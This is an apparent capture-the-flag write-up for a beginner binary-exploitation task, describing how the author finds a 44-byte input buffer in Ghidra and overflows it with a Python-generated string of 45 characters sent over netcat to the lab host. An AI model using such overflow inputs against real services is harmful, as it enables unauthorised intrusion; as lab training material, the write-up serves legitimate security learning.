# Task 28 - Start

Category: pwn
Difficulty: Beginner

# ghidra

We download the file and unzip it. And open up Ghidra and look through it decompiled with CodeBrowser.

We find out that the input from the user seem to be saved in a char array that is set to 44. So what if we submit something longer than that. Let's just use a simple bit of python to generate a string of the character 'a' 45 times.

```
python3 -c 'print("a"*45)'
```

Now let's copy that and use it to submit to the program.

```
nc 10.10.49.167 9008
```

And we get our flag.
